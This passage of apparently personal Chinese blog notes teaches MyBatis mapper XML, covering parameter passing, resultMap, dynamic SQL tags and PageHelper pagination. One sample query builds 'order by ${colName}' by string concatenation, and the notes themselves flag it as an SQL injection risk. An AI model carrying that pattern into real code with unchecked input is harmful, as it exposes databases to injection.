class="comment">    &lt;/select&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectMultiObject&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">          select id,name, email,age from student where</span><br><span class="line">           name=#&#123;paramName&#125;   or age=#&#123;paramAge&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectMultiStudent&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">         select id,name, email,age from student where name=#&#123;name&#125; or age=#&#123;age&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--多个参数使用位置（程序可读性不好 ）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectMultiPosition&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">          select id,name, email,age from student where</span><br><span class="line">          name = #&#123;arg0&#125; or age=#&#123;arg1&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--多个参数，使用Map （能用，但不建议用）, 使用语法 #&#123;map的key&#125;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectMultiByMap&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">          select id,name, email,age from student where</span><br><span class="line">          name = #&#123;myname&#125; or age=#&#123;age&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- #&#123;&#125; 使用?做站位，使用PreparedStatement执行sql，效率高，能够避免sql注入，更安全，推荐使用--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- $&#123;&#125; 不使用占位符，是字符串连接方式，使用Statement对象执行sql，效率低，可以替换列名或表名，有sql注入风险 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUse$Order&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">         select * from student order by $&#123;colName&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>多个参数， 使用java对象进行传参时需要vo包，vo包下创建QueryParam文件如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QueryParam</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String paramName;</span><br><span class="line">    <span class="keyword">private</span> Integer paramAge;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParamName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> paramName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParamName</span><span class="params">(String paramName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.paramName = paramName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getParamAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> paramAge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParamAge</span><span class="params">(Integer paramAge)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.paramAge = paramAge;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ol start="3"><li>mybatis的输出结果<br> mybatis执行了sql语句，得到java对象。<ol><li>resultType结果类型， 指sql语句执行完毕后， 数据转为的java对象， java类型是任意的。<br> resultType结果类型的它值： 1. 类型的全限定名称   2. 类型的别名， 例如 java.lang.Integer别名是int<br>  处理方式：<ol><li>mybatis执行sql语句， 然后mybatis调用类的无参数构造方法，创建对象。</li><li>mybatis把ResultSet指定列值付给同名的属性。<br> &lt;select id&#x3D;”selectMultiPosition” resultType&#x3D;”com.hukaichao.domain.Student”&gt;<br>select id,name, email,age from student<br>  &lt;&#x2F;select&gt;<br>对等的jdbc<br>ResultSet rs &#x3D; executeQuery(“ select id,name, email,age from student” )<br>while(rs.next()){<br>   Student  student &#x3D; new Student();<br>student.setId(rs.getInt(“id”));student.setName(rs.getString(“name”))<br>}</li></ol></li><li>定义自定义类型的别名<ol><li>在mybatis主配置文件中定义，使用&lt;typeAlias&gt;定义别名</li><li>可以在resultType中使用自定义别名<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--定义别名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            第一种方式：</span></span><br><span class="line"><span class="comment">            可以指定一个类型一个自定义别名</span></span><br><span class="line"><span class="comment">            type:自定义类型的全限定名称</span></span><br><span class="line"><span class="comment">            alias:别名（短小，容易记忆的）</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;typeAlias type=&quot;com.hukaichao.domain.Student&quot; alias=&quot;stu&quot; /&gt;</span></span><br><span class="line"><span class="comment">        &lt;typeAlias type=&quot;com.hukaichao.vo.ViewStudent&quot; alias=&quot;vstu&quot; /&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">          第二种方式</span></span><br><span class="line"><span class="comment">          &lt;package&gt; name是包名， 这个包中的所有类，类名就是别名（类名不区分大小写）</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.hukaichao.domain&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.hukaichao.vo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><p>iii. resultMap:结果映射， 指定列名和java对象的属性对应关系。<br>        1）你自定义列值赋值给哪个属性<br>         2）当你的列名和属性名不一样时，一定使用resultMap</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--使用resultMap</span></span><br><span class="line"><span class="comment">       1)先定义resultMap</span></span><br><span class="line"><span class="comment">       2)在select标签，使用resultMap来引用1定义的。</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--定义resultMap</span></span><br><span class="line"><span class="comment">       id:自定义名称，表示你定义的这个resultMap</span></span><br><span class="line"><span class="comment">       type：java类型的全限定名称</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;studentMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--列名和java属性的关系--&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--注解列，使用id标签</span></span><br><span class="line"><span class="comment">           column :列名</span></span><br><span class="line"><span class="comment">           property:java类型的属性名</span></span><br><span class="line"><span class="comment">       --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--非主键列，使用result--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;email&quot;</span> <span class="attr">property</span>=<span class="string">&quot;email&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAllStudents&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;studentMap&quot;</span>&gt;</span></span><br><span class="line">       select id,name, email , age from student</span><br><span class="line">   <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;myStudentMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.hukaichao.domain.MyStudent&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--列名和java属性的关系--&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;stuid&quot;</span> /&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--非主键列，使用result--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;stuname&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;email&quot;</span> <span class="attr">property</span>=<span class="string">&quot;stuemail&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">property</span>=<span class="string">&quot;stuage&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--列名和属性名不一样:第一种方式--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectMyStudent&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;myStudentMap&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        select id,name, email , age from student</span><br><span class="line">   <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--列名和属性名不一样：第二种方式</span></span><br><span class="line"><span class="comment">      resultType的默认原则是 同名的列值赋值给同名的属性， 使用列别名(java对象的属性名)</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectDiffColProperty&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.MyStudent&quot;</span>&gt;</span></span><br><span class="line">       select id as stuid ,name as stuname, email as stuemail , age stuage from student</span><br><span class="line">   <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>resultMap和resultType不要一起用，二选一</p><p><strong>使用like进行模糊查询</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--第一种 like ， java代码指定 like的内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectLikeOne&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">    select id,name,email,age from student where name like #&#123;name&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--第二种方式：在mapper文件中拼接 like的内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectLikeTwo&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">    select id,name,email,age from student where name  like &quot;%&quot; #&#123;name&#125; &quot;%&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="动态sql"><a href="#动态sql" class="headerlink" title="动态sql"></a>动态sql</h2><p> 动态sql: sql的内容是变化的，可以根据条件获取到不同的sql语句。<br>           主要是where部分发生变化。</p><p> 动态sql的实现，使用的是mybatis提供的标签， &lt;if&gt; ,&lt;where&gt;,&lt;foreach&gt;</p><p> 1)&lt;if&gt;是判断条件的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--定义sql片段--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;studentSql&quot;</span>&gt;</span></span><br><span class="line">    select id,name, age, email from student</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;studentSqlOne&quot;</span>&gt;</span></span><br><span class="line">     id,name, age, email</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- if</span></span><br><span class="line"><span class="comment">     &lt;if:test=&quot;使用参数java对象的属性值作为判断条件，语法 属性=XXX值&quot;&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectStudentIf&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">    select <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;studentSqlOne&quot;</span> /&gt;</span> from student</span><br><span class="line">    where id &gt; 0</span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;name !=null and name !=&#x27;&#x27; &quot;</span>&gt;</span></span><br><span class="line">       and name = #&#123;name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age &gt; 0&quot;</span>&gt;</span></span><br><span class="line">        or age &gt; #&#123;age&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 2)&lt;where&gt; 用来包含 多个<if>的， 当多个if有一个成立的， &lt;where&gt;会自动增加一个where关键字，并去掉 if中多余的 and ，or等。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"> where: &lt;where&gt; &lt;if&gt; &lt;if&gt;...&lt;/where&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectStudentWhere&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;studentSql&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;name !=null and name !=&#x27;&#x27; &quot;</span>&gt;</span></span><br><span class="line">            name = #&#123;name&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age &gt; 0&quot;</span>&gt;</span></span><br><span class="line">            or age &gt; #&#123;age&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 3）&lt;foreach&gt; 循环java中的数组，list集合的。 主要用在sql的in语句中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--foreach使用1 ， List&lt;Integer&gt;</span></span><br><span class="line"><span class="comment">    collection:表示接口中的方法参数的类型， 如果是数组使用array , 如果是list集合使用list</span></span><br><span class="line"><span class="comment"> item:自定义的，表示数组和集合成员的变量</span></span><br><span class="line"><span class="comment"> open:循环开始是的字符</span></span><br><span class="line"><span class="comment"> close:循环结束时的字符</span></span><br><span class="line"><span class="comment">    separator:集合成员之间的分隔符</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--&lt;select id=&quot;selectForeachTwo&quot; resultType=&quot;com.hukaichao.domain.Student&quot;&gt;</span></span><br><span class="line"><span class="comment">    select * from student where id in</span></span><br><span class="line"><span class="comment">    &lt;foreach collection=&quot;list&quot; item=&quot;stu&quot; open=&quot;(&quot;  close=&quot;)&quot; separator=&quot;,&quot;&gt;</span></span><br><span class="line"><span class="comment">             #&#123;stu.id&#125;</span></span><br><span class="line"><span class="comment">    &lt;/foreach&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;/select&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectForeachTwo&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;studentSql&quot;</span> /&gt;</span>  where id in (</span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;list&quot;</span> <span class="attr">item</span>=<span class="string">&quot;stu&quot;</span> &gt;</span></span><br><span class="line">        #&#123;stu.id&#125;,</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">    -1 )</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 4）sql代码片段， 就是复用一些语法<br>    步骤:<br>     1.先定义 &lt;sql id&#x3D;”自定义名称唯一”&gt;  sql语句， 表名，字段等&lt;&#x2F;sql&gt;<br>    2.再使用， &lt;include refid&#x3D;”id的值” &#x2F;&gt;</p><h2 id="Mybatis配置文件"><a href="#Mybatis配置文件" class="headerlink" title="Mybatis配置文件"></a>Mybatis配置文件</h2><ol><li><p>数据库的属性配置文件： 把数据库连接信息放到一个单独的文件中。 和mybatis主配置文件分开。<br>  目的是便于修改，保存，处理多个数据库的信息。</p><p>   1）在resources目录中定义一个属性配置文件， xxxx.properties ,例如 jdbc.properties<br> 在属性配置文件中， 定义数据，格式是 key&#x3D;value<br>   key： 一般使用 . 做多级目录的。<br>   例如 jdbc.mysql.driver    , jdbc.driver, mydriver<br>   jdbc.driver&#x3D;com.mysql.jdbc.Driver<br>   jdbc.url&#x3D;jdbc:mysql&#x2F;&#x2F;…..<br>   jdbc.username&#x3D;root<br>   jdbc.password&#x3D;123456<br><br>   2）在mybatis的主配置文件，使用&lt;property&gt; 指定文件的位置<br>  在需要使用值的地方， ${key}</p></li></ol><p> 2.mapper文件，使用package指定路径</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--第一种方式：指定多个mapper文件；第二种方式： 使用包名</span></span><br><span class="line"><span class="comment">        name: xml文件（mapper文件）所在的包名, 这个包中所有xml文件一次都能加载给mybatis</span></span><br><span class="line"><span class="comment">        使用package的要求：</span></span><br><span class="line"><span class="comment">         1. mapper文件名称需要和接口名称一样， 区分大小写的一样</span></span><br><span class="line"><span class="comment">         2. mapper文件和dao接口需要在同一目录</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.hukaichao.dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p> PageHelper插件 做数据分页的<br>现在pom.xml文件中加入相关依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--PageHelper依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>studentdao.xml文件中相关代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在<span class="tag">&lt;<span class="name">environments</span>&gt;</span>之前加入 </span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.github.pagehelper.PageInterceptor&quot;</span> /&gt;</span> &lt;/plugins</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--查询所有--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">    select * from student order by id</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSelectAllPageHelper</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">      <span class="type">StudentDao</span> <span class="variable">dao</span>  <span class="operator">=</span>  sqlSession.getMapper(StudentDao.class);</span><br><span class="line">      <span class="comment">//加入PageHelper的方法，分页</span></span><br><span class="line">      <span class="comment">// pageNum: 第几页， 从1开始</span></span><br><span class="line">      <span class="comment">// pageSize: 一页中有多少行数据</span></span><br><span class="line">      PageHelper.startPage(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">      List&lt;Student&gt; students = dao.selectAll();</span><br><span class="line">      <span class="keyword">for</span>(Student stu:students)&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;foreach--one ===&quot;</span>+stu);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql 笔记</title>
    <link href="/2023/06/18/Mysql%20%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/06/18/Mysql%20%E7%AC%94%E8%AE%B0/</url>
    
